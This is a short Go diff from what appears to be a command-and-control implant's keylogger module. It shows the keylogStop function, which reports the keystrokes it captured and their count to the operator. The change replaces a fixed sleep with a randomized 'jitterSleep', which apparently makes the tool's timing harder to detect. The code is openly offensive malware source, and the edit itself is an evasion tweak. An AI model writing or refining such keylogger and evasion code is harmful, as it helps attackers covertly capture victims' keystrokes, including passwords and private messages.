@@ -154,7 +154,7 @@ func keylogStop() structs.CommandResult {
 	kl.mu.Unlock()
 
 	// Wait briefly for the hook to unhook
-	time.Sleep(200 * time.Millisecond)
+	jitterSleep(150*time.Millisecond, 350*time.Millisecond)
 
 	result := fmt.Sprintf("Keylogger stopped.\nDuration: %s\nKeystrokes captured: %d\n\n--- Captured Keystrokes ---\n%s",
 		duration.Round(time.Second), keyCount, output)
